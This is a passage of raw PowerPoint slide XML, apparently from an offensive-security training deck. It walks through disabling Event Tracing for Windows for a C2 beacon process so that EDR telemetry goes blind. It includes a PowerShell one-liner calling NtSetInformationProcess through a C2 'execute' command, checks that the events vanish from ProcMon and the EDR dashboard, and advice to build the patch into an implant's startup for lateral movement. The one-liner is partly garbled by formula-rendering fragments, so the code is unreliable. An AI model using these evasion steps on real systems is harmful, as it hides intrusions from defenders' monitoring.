              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "Start-Process calc.exe"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>If ETW is patched, the EDR's dashboard should NOT show any telemetry from your process. Calc.exe may still appear in other logs, but your beacon process is now invisible to the EDR.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 7: Alternative – Patch ETW Directly in Memory (No File on Disk)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Instead of uploading ETWPatcher.exe to disk, you can run the patching code directly as a PowerShell one-liner:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>execute -o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -c "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>flags=0;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>=0;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>result = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>System.Runtime.InteropServices.Marshal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>GetDelegateForFunctionPointer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>((Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>NtSetInformationProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>), [Type]([Type[]]@([IntPtr], [Int32], [Int32].</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MakeByRefType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>(), [Int32]))).Invoke((Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CurrentProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>).Handle, 0x3B, [ref]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>flags,4);if(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>flags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>,4);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Math"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="KaTeX_Main"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>result -eq 0) { 'ETW disabled' } else { 'Failed: ' + $result }"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This runs entirely in memory and leaves no file on disk. However, it requires that Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> and Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CurrentProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> are defined in your PowerShell session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12964089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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 8: Verify with Process Monitor (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcMon</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>On the target machine, open Process Monitor. Apply a filter for your beacon process by PID. Before the patch, you will see registry, file, and network events generated by your process. After the patch, these events disappear from Process Monitor. This confirms that ETW is disabled for your process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 9: Verify with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Strings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Sysinternals</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Strings to confirm the patch was applied. The ETW patch modifies the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ProcessTraceFlags</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> in memory, but this is not directly visible via a file scan. The best verification is the absence of telemetry in Process Monitor or in the EDR dashboard.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 10: Important Notes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The patch only affects the current process. If you spawn a new process (e.g., by using Start-Process), the new process will still have ETW enabled. You must re-apply the patch for each new process that your beacon spawns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This bypasses kernel telemetry without touching LSASS or rebooting. It is silent and does not generate any event logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>This technique does not kill or modify the EDR driver. It only stops your process from feeding telemetry. The EDR remains running, but it is blind to your actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 11: Automate ETW Patching in Your Implant</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>To ensure every new process you spawn is ETW-patched, integrate the patching code into your implant's initialization routine. When your implant starts, it should immediately call </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>NtSetInformationProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> to disable ETW. Then, every time it spawns a new process (e.g., for lateral movement), it should also patch the new process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17426974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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>TASK 02 – PART 2 VERIFICATION: LOGMAN QUERY -ETS BEFORE AND AFTER PATCH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>What Is This Verification Step?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> command lists all active Event Tracing for Windows (ETW) sessions running on the system. When you run this command before and after applying the ETW patch, you will see that the ETW sessions are still running. The key difference is that your process is no longer feeding data into them. This proves that you have successfully blinded the EDR without crashing or stopping the ETW system itself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 1: Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>logman</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> query -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>ets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> Before the Patch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>First, run this command through your C2 session to view all active ETW sessions before you apply the patch:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
